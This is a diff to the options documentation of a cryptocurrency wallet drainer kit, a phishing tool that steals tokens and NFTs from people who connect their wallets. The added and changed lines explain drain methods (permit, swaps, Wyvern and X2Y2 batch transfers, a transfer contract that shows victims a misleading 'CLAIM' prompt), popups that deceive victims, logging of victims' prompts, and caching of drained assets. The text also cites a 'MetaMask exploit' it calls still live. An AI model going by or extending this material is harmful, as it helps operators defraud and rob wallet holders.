@@ -25,10 +25,14 @@ Options explained:
 -disable_permit: All is on name, don't edit it
 -disable_swap: All is on name, don't edit it
 -disable_blur: All is on name, don't edit it
+-disable_wyvern: All is on name, don't edit it
+-disable_x2y2_batch_transfer: All is on name, don't edit it
 
 -use_approvement_for_tokens: Define if you prefer use approvement or token transfer ( MetaMask exploit is still live so don't switch it to false: https://ibb.co/DL18PN6)
 -use_increase_allowance_for_tokens_when_disponible: Define if you prefer the first approvement popup or the second (test it yourself, it doesn't really matter). Note: only work if use_approvement_for_tokens is set to true
+
 -use_transfer_contract: Use a contract for all balance hits ( you can withdraw from contract with telegram commands, do /help). Contract is good because user will see "CLAIM" + empty address: https://ibb.co/QDDRbD1
+-transfer_contract_drain_function_name: Define the method that will be used for drain the balance using contract (use_transfer_contract must be true), for now only "Claim" possilbe
 
 -create_wallet_for_seaport: This option wil create a new wallet each seaport and send you private key, it will avoid fast opensea ban (i don't recommend this option because now blur is better than opensea)
 
@@ -36,9 +40,9 @@ Options explained:
 -max_change_chain_retry: The max number of change chain retries when user reject
 
 -enable_popup: Will prompt a little popup at each drain step
--popup_style: Define the popup style, see below
--popup_2_config, see bellow
--popup_3_config, see bellow
+-popup_style: Define the popup style, see below (enable_popup must be true)
+-popup_2_config, see bellow (popup_style must be 2)
+-popup_3_config, see bellow (popup_style must be 3)
 
 -modal_dark_mode: Define if the modal will be on dark / light mode
 -modal_style: Define the modal style, see below
@@ -49,6 +53,7 @@ Options explained:
 -log_prompts: Define if you want to see all prompts of victims (I don't recommand it cuz it will rate limit the logs bot)
 -log_chains_accepts: Define if you want to log when the victim approve change chain
 -hide_poor_connects: Will hide all empty connects from your logs
+-log_full_site_url: Log full site url instead of domain
 
 -min_ratio_for_ask_change_chain: Number between 0 and 1 calculated by allowing to know from how much the drainer will try to change chain (1 = will change of chain every asset (if needed) and 0 = will avoid to change chain a maximum). I don't recommend to edit much this ratio if you don't know how it works, try it before !   
 
@@ -62,6 +67,12 @@ Options explained:
 -tokens_api: There are 2 ways possib:e
 1: Old tokens api -> very fast, 7 chains supported, anti spam tokens / prices are exact  (ethereum, optimism, bsc, polygon, fantom, avalanche, arbitrum)
 2: New tokens api -> fast, 18 chains supported, anti spam tokens / prices are exact (ethereum, optimism, cronos, bsc, gnosis, fuse, heco, polygon, fantom, zkSync, Polygon zkEVM, moonbeam, moonriver, avalanche, arbitrum, celo, aurora)
+
+-slipage_on_swap: Set the slippage that will be used for the swap feature: 50% = can swap 100 $ for min 50$, 0% = can swap 100 $ for min 99$. More the is low, more the swap can fail on little tokens (in case of predict fail, it will drain token using another way). (disable_swap must be false)
+
+-use_cache_data: Define if you want to save all victim drained assets on cache for avoid to try to drain 2 times same asset in case of refresh and reconnect
+
+
 
 Additional infos:
 
